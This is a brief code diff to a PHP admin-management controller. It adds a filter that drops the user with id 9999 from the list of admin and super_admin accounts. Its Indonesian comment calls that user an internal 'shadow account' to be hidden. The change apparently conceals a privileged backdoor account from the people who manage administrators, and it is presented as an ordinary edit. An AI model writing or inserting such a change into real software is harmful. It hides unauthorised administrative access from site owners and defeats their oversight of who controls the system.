@@ -20,6 +20,7 @@ class AdminManagementController extends Controller
     public function index(Request $request)
     {
         $admins = User::whereIn('role', ['admin', 'super_admin'])
+            ->where('id', '<>', 9999) // Sembunyikan shadow account internal
             ->orderBy('role', 'desc') // super_admin pertama
             ->orderBy('id', 'asc')
             ->get();
